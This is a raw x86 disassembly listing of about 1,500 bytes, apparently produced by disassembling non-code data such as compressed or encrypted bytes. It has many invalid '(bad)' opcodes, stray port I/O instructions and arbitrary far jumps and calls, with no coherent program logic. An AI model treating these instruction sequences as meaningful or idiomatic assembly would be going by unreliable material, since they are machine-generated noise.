  418828:	sbb    BYTE PTR [ebp+0x64],cl
  41882b:	add    ebp,ebp
  41882d:	enter  0x6bfe,0xd7
  418831:	scas   eax,DWORD PTR es:[edi]
  418832:	fistp  WORD PTR [ecx+0x636de91]
  418838:	(bad)  
  418839:	jecxz  0x4188b3
  41883b:	enter  0x55f2,0xe5
  41883f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418840:	mov    ch,0x8c
  418842:	stos   BYTE PTR es:[edi],al
  418843:	(bad)  
  418844:	into   
  418845:	stos   BYTE PTR es:[edi],al
  418846:	dec    esp
  418847:	sub    esi,edx
  418849:	daa    
  41884a:	mov    eax,0xfa0f3200
  41884f:	cli    
  418850:	into   
  418851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418852:	loop   0x418875
  418854:	add    al,0x7a
  418856:	sbb    ch,BYTE PTR [esi-0x19e8dedb]
  41885c:	pop    eax
  41885d:	inc    eax
  41885e:	enter  0x33a7,0x64
  418862:	lock push es
  418864:	sbb    DWORD PTR [eax-0x11],ecx
  418867:	ror    BYTE PTR [esp+ebp*4+0x74],1
  41886b:	sbb    DWORD PTR [ecx],0x4c
  41886e:	jecxz  0x4188d7
  418870:	dec    ebx
  418871:	neg    esi
  418873:	cmp    BYTE PTR [ecx],bl
  418875:	sahf   
  418876:	je     0x41882d
  418878:	jo     0x418837
  41887a:	and    al,0x2d
  41887c:	xor    edi,DWORD PTR [ecx+0x1dab7788]
  418882:	xor    dh,BYTE PTR [edx-0x3207ff3f]
  418888:	pop    ds
  418889:	mov    DWORD PTR [esi+ebp*8-0x28],edi
  41888d:	and    DWORD PTR [edx+0x5cead1b6],esi
  418893:	jmp    0x418851
  418895:	sub    BYTE PTR [esi-0x3d1fc72c],ah
  41889b:	scas   al,BYTE PTR es:[edi]
  41889c:	in     eax,dx
  41889d:	adc    DWORD PTR [edi+0x6912e0b2],0x6f
  4188a4:	(bad)  
  4188a5:	out    0x58,al
  4188a7:	push   0xb10edb68
  4188ac:	mov    eax,ds:0x20070ec7
  4188b1:	outs   dx,BYTE PTR ds:[esi]
  4188b2:	std    
  4188b3:	call   DWORD PTR [esi]
  4188b5:	sbb    DWORD PTR [ebx+esi*8],esp
  4188b8:	sbb    eax,0xd546a625
  4188bd:	dec    ebx
  4188be:	ret    0x2712
  4188c1:	mov    ebx,0xad47477
  4188c6:	outs   dx,BYTE PTR ds:[esi]
  4188c7:	mov    esi,0xec00183c
  4188cc:	sub    DWORD PTR [esi-0x7e],edi
  4188cf:	ins    BYTE PTR es:[edi],dx
  4188d0:	and    ch,dh
  4188d2:	mov    ebx,ebx
  4188d4:	mov    cl,0x1c
  4188d6:	inc    edx
  4188d7:	or     esp,DWORD PTR [ecx+0x78e3c49e]
  4188dd:	adc    cl,bl
  4188df:	ins    DWORD PTR es:[edi],dx
  4188e0:	leave  
  4188e1:	ret    
  4188e2:	add    BYTE PTR [ebx+0x17e88dbe],0xe
  4188e9:	push   ebp
  4188ea:	les    esi,FWORD PTR [edi-0x41193af2]
  4188f0:	xchg   ebp,eax
  4188f1:	sahf   
  4188f2:	sub    eax,0x8b2b1f90
  4188f7:	jb     0x4188b8
  4188f9:	clc    
  4188fa:	mov    dl,0x6d
  4188fc:	jle    0x4188da
  4188fe:	xor    DWORD PTR [eax+0x16985ca5],edi
  418904:	loopne 0x4188f1
  418906:	test   al,0xf2
  418908:	lock push ds
  41890a:	mov    edx,0x184ddb05
  41890f:	call   0x8782e9c7
  418914:	dec    esi
  418915:	jne    0x4188d4
  418917:	cmp    cl,dl
  418919:	push   eax
  41891a:	ss xor bh,bl
  41891d:	out    0xd8,eax
  41891f:	jo     0x4188d1
  418921:	enter  0xf2b6,0xa
  418925:	cmp    BYTE PTR [ebp+0x71aaf475],0x79
  41892c:	cmp    bl,BYTE PTR [ebp-0x41c73a82]
  418932:	daa    
  418933:	aas    
  418934:	mov    al,0xa5
  418936:	iret   
  418937:	repz xchg edx,eax
  418939:	jmp    0x8c92:0x2f2608b
  418940:	push   cs
  418941:	jne    0x4189a7
  418943:	aad    0xb9
  418945:	xchg   esi,eax
  418946:	fsubr  st,st(5)
  418948:	mov    DWORD PTR [edi-0x3e],edx
  41894b:	sahf   
  41894c:	aam    0x4
  41894e:	add    al,0x6
  418950:	js     0x41899d
  418952:	push   ss
  418953:	push   esp
  418954:	pop    edx
  418955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418956:	dec    esi
  418957:	out    0x30,eax
  418959:	mov    ecx,0xbdaca833
  41895e:	adc    DWORD PTR [eax],0xa4975553
  418964:	imul   esp,DWORD PTR [ebx+0x7861530],0xffffff96
  41896b:	cmc    
  41896c:	pop    edi
  41896d:	clc    
  41896e:	pop    ds
  41896f:	sti    
  418970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418971:	ins    BYTE PTR es:[edi],dx
  418972:	mov    esp,0xca20a103
  418977:	cmp    dl,BYTE PTR [esi+0x65a89f87]
  41897d:	mov    ss,WORD PTR [ebx]
  41897f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418980:	fsubr  QWORD PTR [edi-0x3099729]
  418986:	dec    ebp
  418987:	mov    esi,0x500b694f
  41898c:	or     DWORD PTR [edx],eax
  41898e:	xor    BYTE PTR [eax-0x70bf2ae5],ah
  418994:	and    al,0x1a
  418996:	sub    esp,DWORD PTR [edi-0x7ca16918]
  41899c:	cmp    DWORD PTR [eax],edi
  41899e:	mov    ebx,0x57022b53
  4189a3:	xor    DWORD PTR [edi+0x5d],ebx
  4189a6:	scas   eax,DWORD PTR es:[edi]
  4189a7:	mov    BYTE PTR [eax+0x1b],bl
  4189aa:	push   esp
  4189ab:	lock mov eax,ds:0x39fbb5f6
  4189b1:	dec    ebx
  4189b2:	push   ebp
  4189b3:	push   esi
  4189b4:	data16 loope 0x41896b
  4189b7:	mov    ecx,0xc19a502f
  4189bc:	sub    ebp,DWORD PTR [esi+0x2d1485ed]
  4189c2:	mov    eax,0x3829c306
  4189c7:	xor    esp,edx
  4189c9:	(bad)  
  4189ca:	push   ebp
  4189cb:	lock adc eax,ebp
  4189ce:	int3   
  4189cf:	fsqrt  
  4189d1:	mov    bl,0xb1
  4189d3:	pop    ebx
  4189d4:	iret   
  4189d5:	cmp    ecx,DWORD PTR [ebx+0x9]
  4189d8:	jb     0x418a02
  4189da:	dec    ecx
  4189db:	push   edi
  4189dc:	mov    bh,0xcd
  4189de:	sbb    DWORD PTR [edx],0xffffffbe
  4189e1:	bound  ebx,QWORD PTR [ebp-0x31f7b502]
  4189e7:	jb     0x418999
  4189e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189ea:	je     0x41897f
  4189ec:	popf   
  4189ed:	jmp    0x71a7:0xf762fced
  4189f4:	jge    0x4189b7
  4189f6:	cld    
  4189f7:	aas    
  4189f8:	test   BYTE PTR ds:0xb2104d29,0x7b
  4189ff:	arpl   bx,dx
  418a01:	mov    al,ds:0xeeea401f
  418a06:	xor    BYTE PTR [ebp+0x7915ba50],0xfe
  418a0d:	test   al,0x20
  418a0f:	pop    ds
  418a10:	mov    eax,0x5b11cc68
  418a15:	enter  0xe21,0xc1
  418a19:	out    0x88,al
  418a1b:	add    al,0xa1
  418a1d:	enter  0x7d1d,0xb9
  418a21:	pop    ds
  418a22:	jp     0x418a01
  418a24:	scas   al,BYTE PTR es:[di]
  418a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a27:	shr    bh,0x2a
  418a2a:	retf   0xd9d5
  418a2d:	fdivr  QWORD PTR [edx+0x453f6003]
  418a33:	cmp    ebp,DWORD PTR [esi]
  418a35:	xor    eax,0x95a74408
  418a3a:	sub    BYTE PTR [edx],dl
  418a3c:	pusha  
  418a3d:	lods   al,BYTE PTR ds:[esi]
  418a3e:	sti    
  418a3f:	daa    
  418a40:	pop    esp
  418a41:	push   es
  418a42:	lods   eax,DWORD PTR ds:[esi]
  418a43:	or     al,0x53
  418a45:	cmc    
  418a46:	aaa    
  418a47:	ror    BYTE PTR [edx],1
  418a49:	mov    al,ds:0xa6f67fed
  418a4e:	cmp    al,0x6e
  418a50:	dec    ebx
  418a51:	cmp    DWORD PTR [edx-0x49],ebx
  418a54:	idiv   BYTE PTR [edx+0x203716fc]
  418a5a:	(bad)  
  418a5b:	sar    BYTE PTR [ecx-0xd681527],cl
  418a61:	les    eax,FWORD PTR [esi]
  418a63:	push   esi
  418a64:	int    0xbf
  418a66:	int3   
  418a67:	mov    al,ds:0xe4e8e295
  418a6c:	mov    ah,0xa7
  418a6e:	sub    DWORD PTR [edi],ebx
  418a70:	js     0x418a44
  418a72:	cld    
  418a73:	ins    BYTE PTR es:[edi],dx
  418a74:	addr16 pop edi
  418a76:	xchg   ebp,eax
  418a77:	rcl    al,0x15
  418a7a:	repz adc eax,0x794f0298
  418a80:	jle    0x418a69
  418a82:	sar    BYTE PTR [edi+0x7043898a],1
  418a88:	aas    
  418a89:	jae    0x418ab2
  418a8b:	xor    eax,0xe21dd226
  418a90:	int3   
  418a91:	xor    BYTE PTR [ebp-0x9838888],al
  418a97:	push   cs
  418a98:	lea    eax,[eax+0x27577529]
  418a9e:	mov    dh,0xff
  418aa0:	(bad)  
  418aa1:	pop    ebx
  418aa2:	add    al,0xc8
  418aa4:	and    ebp,DWORD PTR [eax+0x4d]
  418aa7:	or     cl,ah
  418aa9:	fild   QWORD PTR [esp+ebp*4-0x76aed2c3]
  418ab0:	add    eax,DWORD PTR [esi+0x2affd4d6]
  418ab6:	push   es
  418ab7:	lea    edx,[edi]
  418ab9:	jb     0x418a9b
  418abb:	cmp    bh,BYTE PTR [edx+ecx*2]
  418abe:	mov    edx,0x7422e9b2
  418ac3:	repz test bl,dh
  418ac6:	scas   al,BYTE PTR es:[edi]
  418ac7:	pop    edi
  418ac8:	sub    al,0x80
  418aca:	ret    0x125f
  418acd:	xchg   ebp,eax
  418ace:	or     DWORD PTR [ebx],0x37
  418ad1:	cmp    eax,0x45abb0fe
  418ad6:	mov    eax,0xda3b93c6
  418adb:	pop    eax
  418adc:	test   al,0x38
  418ade:	or     al,0x64
  418ae0:	test   DWORD PTR [edi-0x64],esp
  418ae3:	cmp    DWORD PTR [esi-0x1],edi
  418ae6:	ins    BYTE PTR es:[edi],dx
  418ae7:	retf   
  418ae8:	lods   eax,DWORD PTR ds:[esi]
  418ae9:	pop    esp
  418aea:	mul    BYTE PTR [ebp-0x7c]
  418aed:	loopne 0x418b3f
  418aef:	pushf  
  418af0:	ja     0x418aa9
  418af2:	pusha  
  418af3:	dec    edi
  418af4:	xchg   edx,eax
  418af5:	and    BYTE PTR [eax],dh
  418af7:	mov    gs,WORD PTR [eax+ebp*2]
  418afa:	jns    0x418b42
  418afc:	mov    ah,0xd9
  418afe:	(bad)  
  418aff:	ins    BYTE PTR es:[edi],dx
  418b00:	div    BYTE PTR [ebp+edx*1-0x3c]
  418b04:	inc    edi
  418b05:	cdq    
  418b06:	cmp    al,0x47
  418b08:	fdiv   DWORD PTR [eax]
  418b0a:	or     esi,DWORD PTR [ecx-0x71]
  418b0d:	jno    0x418b2b
  418b0f:	fimul  WORD PTR [ecx-0x7976ba2d]
  418b15:	inc    edi
  418b16:	jmp    0x81b2:0xd2af1690
  418b1d:	nop
  418b1e:	in     al,0xa2
  418b20:	jl     0x418ae5
  418b22:	ins    BYTE PTR es:[edi],dx
  418b23:	mov    ch,0x71
  418b25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b26:	inc    edx
  418b27:	xchg   esp,eax
  418b28:	or     eax,0xe40ef049
  418b2d:	ss dec edx
  418b2f:	rep stos BYTE PTR es:[edi],al
  418b31:	cmp    edx,DWORD PTR [edx]
  418b33:	fiadd  DWORD PTR [eax]
  418b35:	pop    ebp
  418b36:	dec    edi
  418b37:	xchg   DWORD PTR [ebx],ecx
  418b39:	pop    edx
  418b3a:	mov    ds:0xf8f22950,al
  418b3f:	js     0x418ba2
  418b41:	stos   DWORD PTR es:[edi],eax
  418b42:	or     cl,BYTE PTR [eax]
  418b44:	lods   al,BYTE PTR ds:[esi]
  418b45:	mov    eax,0xe3406e59
  418b4a:	adc    BYTE PTR [esi-0x1a6f2817],ah
  418b50:	jp     0x418b5f
  418b52:	fwait
  418b53:	rcr    DWORD PTR [ebp+0x685d039e],cl
  418b59:	cdq    
  418b5a:	mov    dl,0x39
  418b5c:	mov    esi,0x600cc3ad
  418b61:	or     DWORD PTR [eax+0x49],0x44
  418b65:	push   esp
  418b66:	std    
  418b67:	(bad)
  418b6a:	dec    esp
  418b6b:	cli    
  418b6c:	imul   ebp,DWORD PTR [ecx],0xfffffff0
  418b6f:	imul   ecx,DWORD PTR [edx+0x8b313c2],0x3f69fde3
  418b79:	lock std 
  418b7b:	xchg   ax,ax
  418b7d:	jp     0x418b73
  418b7f:	dec    BYTE PTR ds:0x9051c1bb
  418b85:	xor    ch,BYTE PTR [esi+edx*8]
  418b88:	cmp    ebx,edi
  418b8a:	mov    bh,0xdd
  418b8c:	mov    ds:0x72cfc089,al
  418b91:	sub    esp,ebx
  418b93:	xchg   esi,eax
  418b94:	pop    ecx
  418b95:	adc    DWORD PTR [ebx+0x61332a2f],esp
  418b9b:	or     edi,DWORD PTR [eax-0x4a196ee1]
  418ba1:	or     eax,0x730e197f
  418ba6:	push   eax
  418ba7:	push   esi
  418ba8:	test   edx,esi
  418baa:	adc    dh,BYTE PTR [edx-0x4]
  418bad:	popa   
  418bae:	dec    ebp
  418baf:	or     dh,dl
  418bb1:	jecxz  0x418c00
  418bb3:	gs add edx,DWORD PTR ds:[ebx-0x13f73ff7]
  418bbb:	pop    es
  418bbc:	in     eax,dx
  418bbd:	les    esi,FWORD PTR [edi+0x717503e]
  418bc3:	out    0xf7,eax
  418bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bc6:	cmp    cl,0x3e
  418bc9:	loope  0x418c42
  418bcb:	cmp    ebx,DWORD PTR [ecx+0x11]
  418bce:	sbb    BYTE PTR [ebx+0x44],dh
  418bd1:	js     0x418c23
  418bd3:	push   esi
  418bd4:	dec    ecx
  418bd5:	jge    0x418c2d
  418bd7:	retf   0xd644
  418bda:	sti    
  418bdb:	push   cs
  418bdc:	iret   
  418bdd:	xchg   ebp,eax
  418bde:	sbb    esi,edx
  418be0:	fdiv   DWORD PTR [eax]
  418be2:	or     eax,DWORD PTR [edx]
  418be4:	or     eax,0x480aa63f
  418be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bea:	adc    DWORD PTR [ecx+0x42f7e684],0xffffff8e
  418bf1:	push   ecx
  418bf2:	clc    
  418bf3:	adc    eax,0x663db4a1
  418bf8:	lahf   
  418bf9:	mov    al,ds:0x41a7f22c
  418bfe:	sahf   
  418bff:	add    al,0x90
  418c01:	je     0x418c3f
  418c03:	xor    eax,0x8b106502
  418c08:	sub    ebx,esi
  418c0a:	inc    edi
  418c0b:	repnz stos BYTE PTR es:[edi],al
  418c0d:	bound  ebx,QWORD PTR [ecx+ebx*2+0x5a1f8855]
  418c14:	dec    edi
  418c15:	jne    0x418bac
  418c17:	repz push ss
  418c19:	inc    ebp
  418c1a:	fbstp  TBYTE PTR [ebx+0x4ffe8728]
  418c20:	ja     0x418ba4
  418c22:	mov    edx,0x5a60aa57
  418c27:	out    dx,eax
  418c28:	fcomp  DWORD PTR [ebp+ecx*1-0x12e5346d]
  418c2f:	mov    dh,0x79
  418c31:	push   esp
  418c32:	int    0x13
  418c34:	mov    eax,DWORD PTR [eax+0x2802acde]
  418c3a:	popa   
  418c3b:	fisttp DWORD PTR [ecx]
  418c3d:	aas    
  418c3e:	sbb    DWORD PTR [edx+0x6ec1984f],0x66
  418c45:	fadd   DWORD PTR [edx-0x68eff8a0]
  418c4b:	ins    BYTE PTR es:[edi],dx
  418c4c:	fs ret 0x1c3c
  418c50:	ficomp WORD PTR [edx]
  418c52:	or     al,0xd1
  418c54:	sub    al,0xf0
  418c56:	xor    al,0xe1
  418c58:	test   DWORD PTR [edx+edi*2+0x2b88dcc9],0x4a7b905e
  418c63:	sbb    DWORD PTR [ecx+0x178e1811],0x55e50c07
  418c6d:	mov    DWORD PTR [esi],ebp
  418c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c70:	push   ebp
  418c71:	sub    bh,BYTE PTR [edi+0x201556f0]
  418c77:	cmp    eax,0x170448b1
  418c7c:	or     al,BYTE PTR [ebx+0x78e22b4a]
  418c82:	xor    DWORD PTR [ecx+ebp*8+0x64cdd93e],ebx
  418c89:	shl    DWORD PTR [ebx+0x67],1
  418c8c:	push   ds
  418c8d:	gs cmp eax,0xad20a82
  418c93:	inc    edx
  418c94:	xchg   esp,eax
  418c95:	fimul  WORD PTR [edi]
  418c97:	(bad)  [ebx-0x2b]
  418c9a:	test   DWORD PTR [ebx-0x74],esp
  418c9d:	adc    edx,DWORD PTR [ebx-0x6f]
  418ca0:	dec    esi
  418ca1:	xchg   edi,eax
  418ca2:	sub    cl,BYTE PTR [eax+0x44]
  418ca5:	in     al,dx
  418ca6:	pop    edi
  418ca7:	dec    ecx
  418ca8:	out    0xbf,al
  418caa:	js     0x418ca2
  418cac:	pop    es
  418cad:	fild   DWORD PTR [ecx+0x46b05a89]
  418cb3:	cmp    BYTE PTR [eax+0x23],ch
  418cb6:	lods   eax,DWORD PTR ds:[esi]
  418cb7:	sbb    al,0xf1
  418cb9:	faddp  st(2),st
  418cbb:	and    al,0x6e
  418cbd:	pop    ds
  418cbe:	jmp    0x544e:0xbf3dd0a8
  418cc5:	(bad)  
  418cc6:	arpl   WORD PTR [esi],dx
  418cc8:	mov    edx,DWORD PTR [edx]
  418cca:	dec    esp
  418ccb:	test   DWORD PTR [ebx-0x6f166ddd],eax
  418cd1:	aam    0x27
  418cd3:	enter  0x7419,0x4a
  418cd7:	shl    DWORD PTR [esi-0x7e],1
  418cda:	cmp    BYTE PTR cs:[esi],ah
  418cdd:	push   esi
  418cde:	push   ecx
  418cdf:	xchg   edi,eax
  418ce0:	or     DWORD PTR [ebx+0x61],esp
  418ce3:	call   0xf0d:0xa5147861
  418cea:	pop    edi
  418ceb:	fdivr  DWORD PTR [ebx-0xc42df33]
  418cf1:	mov    eax,0x2ba75c73
  418cf6:	inc    DWORD PTR ds:0xd62b125b
  418cfc:	jl     0x418d50
  418cfe:	int3   
  418cff:	add    ch,BYTE PTR [edi+0x56f6d675]
  418d05:	and    BYTE PTR [edx],0x4c
  418d08:	fdivp  st(7),st
  418d0a:	adc    BYTE PTR [ebx+0x133f3f79],al
  418d10:	add    dh,BYTE PTR [eax]
  418d12:	inc    ebp
  418d13:	pop    ds
  418d14:	cmp    DWORD PTR [ecx],ecx
  418d16:	jae    0x418cd1
  418d18:	push   ecx
  418d19:	sbb    al,BYTE PTR [edx-0x78ed5940]
  418d1f:	test   DWORD PTR [ebp+0x5b2da2af],edi
  418d25:	mov    eax,0x53639e41
  418d2a:	dec    edi
  418d2b:	dec    esi
  418d2c:	(bad)  
  418d2d:	adc    ecx,DWORD PTR [edi+0x4a]
  418d30:	nop
  418d31:	dec    esp
  418d32:	cmp    al,0x49
  418d34:	les    edi,FWORD PTR [esi-0x87d9721]
  418d3a:	hlt    
  418d3b:	xor    eax,0xb8765b99
  418d40:	gs sub eax,0xa3d3e7f5
  418d46:	cmp    BYTE PTR [ebx-0x38],bl
  418d49:	add    ch,ah
  418d4b:	into   
  418d4c:	xchg   ecx,eax
  418d4d:	and    bh,0xd7
  418d50:	or     eax,0x10faeeb5
  418d55:	jo     0x418dce
  418d57:	in     eax,dx
  418d58:	ins    BYTE PTR es:[edi],dx
  418d59:	das    
  418d5a:	je     0x418d1a
  418d5c:	mov    ebx,0x8431a291
  418d61:	rcr    BYTE PTR [ebp+eax*4-0x5cd628df],1
  418d68:	and    eax,0x190da0fa
  418d6d:	mov    ebp,0xcc7e188a
  418d72:	or     DWORD PTR [ecx+0x37c3999c],eax
  418d78:	(bad)  
  418d79:	ins    DWORD PTR es:[edi],dx
  418d7a:	out    dx,al
  418d7b:	push   eax
  418d7c:	mov    ch,BYTE PTR [eax]
  418d7e:	add    esi,DWORD PTR [edi+0x42]
  418d81:	scas   al,BYTE PTR es:[edi]
  418d82:	xchg   ebp,eax
  418d83:	je     0x418d93
  418d85:	hlt    
  418d86:	shl    DWORD PTR [ecx+0x77a702a0],1
  418d8c:	(bad)  
  418d8d:	repnz shl eax,cl
  418d90:	shr    DWORD PTR [ecx+0x705d29e],1
  418d96:	mov    al,ds:0xeedacde6
  418d9c:	call   0x8973291e
  418da1:	inc    eax
  418da2:	out    0xcd,al
  418da4:	mov    al,ch
  418da6:	repz inc edx
  418da8:	nop
  418da9:	inc    ecx
  418daa:	jnp    0x418d3c
  418dac:	and    BYTE PTR ds:0x5c7d2bce,ah
  418db2:	sti    
  418db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418db4:	(bad)  
  418db5:	mov    esp,DWORD PTR [edx+0x10]
  418db8:	mov    ebp,0xd46ffa87
  418dbd:	rol    BYTE PTR [edx],0x1a
  418dc0:	mov    edi,0xad88dc4
  418dc5:	pop    ds
  418dc6:	sbb    dh,BYTE PTR [ebx]
  418dc8:	pop    esi
  418dc9:	data16 loopne 0x418d8b
  418dcc:	stc    
  418dcd:	retf   
  418dce:	rcl    BYTE PTR [eax-0x29],0xcc
  418dd2:	(bad)  
  418dd3:	fsubr  st,st(2)
  418dd5:	lds    edi,FWORD PTR [esi+0x5c4a49ff]
  418ddb:	imul   esp,DWORD PTR es:[edi+0xa8aba7b],0xb4e2b0d5
  418de6:	in     al,dx
  418de7:	retf   
  418de8:	pop    edx
  418de9:	xchg   DWORD PTR [edx+0x1],edi
  418dec:	cli    
  418ded:	xchg   ecx,eax
  418dee:	push   0x5c
  418df0:	xchg   ecx,eax
  418df1:	add    edi,esi
  418df3:	sahf   
  418df4:	imul   ebp,ebx,0x29
  418df7:	pop    ebp
  418df8:	neg    BYTE PTR [ebp+0x7b]
  418dfb:	addr16 aam 0x1f
  418dfe:	jno    0x418e59
  418e00:	cs xor eax,0xd43bd556
  418e06:	mov    edi,0x95942fee
  418e0b:	pusha  
  418e0c:	cmp    bl,cl
  418e0e:	pop    ebp
  418e0f:	push   edi
  418e10:	xor    al,0xf9
  418e12:	mov    ds:0x2b9b887d,eax
  418e17:	sti    
  418e18:	adc    al,0x3b
  418e1a:	imul   edi,ebx,0x31ef9537
  418e20:	jle    0x418df6
  418e22:	push   eax
  418e23:	bound  ebp,QWORD PTR [esi]
  418e25:	pop    esp
  418e26:	(bad)  
  418e27:	sbb    DWORD PTR [ebp+0x3e],edi
  418e2a:	xor    BYTE PTR [edx+0x11],0x6c
  418e2e:	xlat   BYTE PTR ds:[ebx]
  418e2f:	xchg   ebx,eax
  418e30:	jae    0x418dcb
  418e32:	les    esp,FWORD PTR ds:0xfd09d639
  418e38:	test   eax,0x3e2b432a
  418e3d:	ja     0x418e87
  418e3f:	inc    ebx
  418e40:	lea    esi,[ebp+0x540bc841]
  418e46:	sub    eax,0x27ae86c8
  418e4b:	and    al,0x91
  418e4d:	sub    bl,bl
  418e4f:	inc    esi
  418e50:	aad    0x29
  418e52:	dec    eax
  418e53:	pop    ss
  418e54:	pop    ebx
  418e55:	adc    DWORD PTR [edx+0x444a52f3],0x2902528f
  418e5f:	xchg   edx,eax
  418e60:	arpl   WORD PTR [edi+0x42],ax
  418e63:	aas    
  418e64:	dec    eax
  418e65:	mov    esp,0xb5a70e5a
  418e6a:	sub    DWORD PTR [ecx],ebx
  418e6c:	out    0x2c,al
  418e6e:	hlt    
  418e6f:	fistp  DWORD PTR [edi+eiz*1+0x617820a0]
  418e76:	add    dh,bl
  418e78:	jb     0x418e0a
  418e7a:	dec    esi
  418e7b:	or     dl,BYTE PTR [eax-0x5d75d76]
  418e81:	add    eax,0x13e5ff7
  418e86:	call   0xb9bffa99
  418e8b:	add    eax,0x997c89c3
  418e90:	int    0xaa
  418e92:	test   esp,0x3ca6311
  418e98:	push   eax
  418e99:	or     esp,DWORD PTR [edi+ebx*8]
  418e9c:	sub    DWORD PTR [ebx],ebx
  418e9e:	inc    ebx
  418e9f:	xor    BYTE PTR [ebp+0x2a551425],ah
  418ea5:	inc    edx
  418ea6:	or     BYTE PTR [ebx-0x55d613dc],ch
  418eac:	inc    edi
  418ead:	repz das 
  418eaf:	xor    BYTE PTR [esi-0x1097c8c1],al
  418eb5:	add    eax,0xfd2f82a0
  418eba:	lock jnp 0x418e48
  418ebd:	mov    edx,0x75b9c51e
  418ec2:	xlat   BYTE PTR ds:[ebx]
  418ec3:	inc    ecx
  418ec4:	fsubr  DWORD PTR [esp+edx*4]
  418ec7:	fwait
  418ec8:	dec    ebx
  418ec9:	xchg   ebx,eax
  418eca:	mov    dl,0x76
  418ecc:	jmp    0x418f00
  418ece:	das    
  418ecf:	idiv   DWORD PTR [edx-0x7d]
  418ed2:	int3   
  418ed3:	xchg   DWORD PTR [edx+0xaa529a8],edi
  418ed9:	rcl    DWORD PTR [eax+eiz*1+0x7b],cl
  418edd:	jmp    0xf84:0x8855eb79
  418ee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ee5:	stos   BYTE PTR es:[edi],al
  418ee6:	lea    esi,[edi-0x59]
  418ee9:	icebp  
  418eea:	mov    DWORD PTR [eax+0x532f8ecc],esp
  418ef0:	cld    
  418ef1:	hlt    
  418ef2:	mov    edi,0x9f5ebea5
  418ef7:	adc    eax,0x4eea059c
  418efc:	nop
  418efd:	jo     0x418f3d
  418eff:	mov    ds:0xcebec726,al
  418f04:	je     0x418f39
  418f06:	retf   
  418f07:	jecxz  0x418f6e
  418f09:	(bad)  [edx-0x4c]
  418f0c:	pop    ebx
  418f0d:	xor    DWORD PTR [ebp+0x7e44d030],ecx
  418f13:	test   BYTE PTR [ecx-0x3d],bh
  418f16:	mov    cl,0x5f
  418f18:	pop    es
  418f19:	xor    BYTE PTR [ebx+ebp*2],dl
  418f1c:	mov    edx,esp
  418f1e:	loop   0x418ed8
  418f20:	add    DWORD PTR [edi-0x17],ebp
  418f23:	aad    0x5
  418f25:	cmp    BYTE PTR [esi+0x6a63f8fa],dl
  418f2b:	ins    BYTE PTR es:[edi],dx
  418f2c:	cwde   
  418f2d:	pop    esi
  418f2e:	or     bh,BYTE PTR [eax-0x46]
  418f31:	call   0x33b8df57
  418f36:	(bad)  
  418f38:	and    edx,DWORD PTR [ecx+0x4d]
  418f3b:	cmp    eax,0xba485bd4
  418f40:	and    bh,al
  418f42:	adc    dh,BYTE PTR [edx+0x6f]
  418f45:	ss das 
  418f47:	xchg   DWORD PTR [ecx-0x3a],esp
  418f4a:	cmp    BYTE PTR [edx],dh
  418f4c:	mov    ecx,0xcc1081e1
  418f51:	jb     0x418f2d
  418f53:	(bad)  
  418f54:	aad    0x4b
  418f56:	popw   es
  418f58:	or     DWORD PTR [edx+0x50],0x68247dab
  418f5f:	jae    0x418f75
  418f61:	aam    0x3c
  418f63:	leave  
  418f64:	outs   dx,DWORD PTR ds:[esi]
  418f65:	(bad)  
  418f66:	pop    edi
  418f67:	pop    edx
  418f68:	mov    al,ds:0x961c7cb8
  418f6d:	dec    edi
  418f6e:	shr    DWORD PTR [eax+0x37],cl
  418f71:	mov    edx,0x9b642842
  418f76:	call   0x6e18:0x7c35c6e5
  418f7d:	or     eax,0xa93de34b
  418f82:	inc    edx
  418f83:	push   esi
  418f84:	xor    esi,ebp
  418f86:	mov    cs,WORD PTR gs:[edx+ebp*2+0x743fc369]
  418f8e:	sbb    eax,0xbc7c40d3
  418f93:	rol    DWORD PTR [eax],1
  418f95:	loop   0x418ff1
  418f97:	ret    0x265c
  418f9a:	cmp    BYTE PTR [ebx-0x5e3f7641],ch
  418fa0:	adc    edx,esp
  418fa2:	pusha  
  418fa3:	cdq    
  418fa4:	(bad)  
  418fa6:	adc    edi,eax
  418fa8:	xor    eax,0x65f9edb
  418fad:	dec    edx
  418fae:	xchg   esp,eax
  418faf:	pusha  
  418fb0:	ins    DWORD PTR es:[edi],dx
  418fb1:	arpl   WORD PTR [ecx-0x2b],bp
  418fb4:	mov    esp,0x69aa23e8
  418fb9:	lea    edx,[ebx+0x69]
  418fbc:	retf   
  418fbd:	stos   DWORD PTR es:[edi],eax
  418fbe:	xchg   ecx,eax
  418fbf:	jae    0x418f85
  418fc1:	adc    DWORD PTR [eax-0x177dc09a],esi
  418fc7:	xchg   edi,eax
  418fc8:	neg    BYTE PTR [ebp-0x3e32ad22]
  418fce:	ret    
  418fcf:	daa    
  418fd0:	dec    esp
  418fd1:	ret    0x8550
  418fd4:	sub    esi,DWORD PTR [edi-0x1b707bd6]
  418fda:	sub    eax,0x7838f1bd
  418fdf:	adc    BYTE PTR [ebp+0x5b42d4ce],0x75
  418fe6:	xor    edi,DWORD PTR [eax]
  418fe8:	pusha  
  418fe9:	inc    eax
  418fea:	imul   ebp,DWORD PTR [eax+ebp*1-0x34],0x5f
  418fef:	pop    esi
  418ff0:	sub    cl,ah
  418ff2:	(bad)  
  418ff3:	sub    dh,cl
  418ff5:	fcomp  QWORD PTR [edx]
  418ff7:	out    0x33,al
  418ff9:	stos   DWORD PTR es:[edi],eax
  418ffa:	jge    0x418ff2
  418ffc:	sahf   
  418ffd:	inc    edi
  418ffe:	and    DWORD PTR [edx+0x31a2cdd1],ecx
  419004:	dec    ecx
  419005:	nop
  419006:	repnz push 0xffffffb9
  419009:	scas   al,BYTE PTR es:[edi]
  41900a:	adc    al,0xc3
  41900c:	mov    ch,0xa2
  41900e:	imul   ebx,DWORD PTR [edx-0x120ba012],0x88d69685
  419018:	lahf   
